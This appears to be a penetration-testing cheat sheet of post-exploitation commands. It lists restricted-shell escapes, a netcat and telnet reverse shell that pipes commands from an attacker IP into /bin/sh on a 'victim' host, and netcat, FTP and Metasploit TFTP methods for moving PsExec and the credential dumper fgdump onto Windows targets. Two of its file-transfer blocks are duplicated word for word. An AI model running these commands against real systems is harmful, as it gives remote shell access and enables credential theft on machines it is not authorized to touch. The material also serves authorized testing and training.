# Useful commands and check exist command 
- Jail shell
  ~~~sh
  python -c 'import pty;pty.spawn("/bin/bash")'
  echo os.system('/bin/bash')
  /bin/sh -i

  :!bash # vi, vim
  :set shell=/bin/bash:shell # vi, vim
  !bash # man, more, less
  find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' # find
  awk 'BEGIN {system("/bin/bash")}' # awk
  perl -e 'exec "/bin/bash";' # Perl 
  ~~~

- Establish the connection with victim
  ~~~sh
  # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
  nc -lvp 4444    # Attacker. Input (Commands)
  nc -lvp 4445    # Attacker. Ouput (Results)
  telnet ${AttackerIP} 4444 | /bin/sh | ${AttackerIP} 4445    # On the targets system. Use the attackers IP!
  ~~~

## File transfer
  - nc/ncat
    - from Kali to Windows
      ~~~sh
      # sending
      nc -w 3 ${DESTIP} ${DESTPORT} < send.file
      # Receiving
      cmd /c nc.exe -l -v -p ${DESTPORT} > PsExec.exe
      ~~~
    - from Windows to Kali
      ~~~sh
      # sending
      nc -w 3 ${DESTIP} ${DESTPORT} < send.file
      # Receiving
      cmd /c nc.exe -l -v -p ${DESTPORT} > PsExec.exe
      ~~~

  - ftp/tftp
    - Python(FTP server) on Kali
      - 2
        ~~~sh
        pip install pyftpdlib
        python -m pyftpdlib -p 21
        ~~~
      - 3
        ~~~sh
        pip3 install pyftpdlib
        python3 -m pyftpdlib -p 21
        ~~~

    - Metasploit(TFTP server)
      ~~~sh
      use auxiliary/server/tftp
      set TFTPROOT /path/to/dir
      run
      ~~~

    - Client on Windows
      ~~~sh
      # Manual: https://technet.microsoft.com/en-us/library/ff698993(v=ws.11).aspx
      TFTP.EXE -i ${MyIP} get fgdump.exe C:\Users\Public
      ~~~
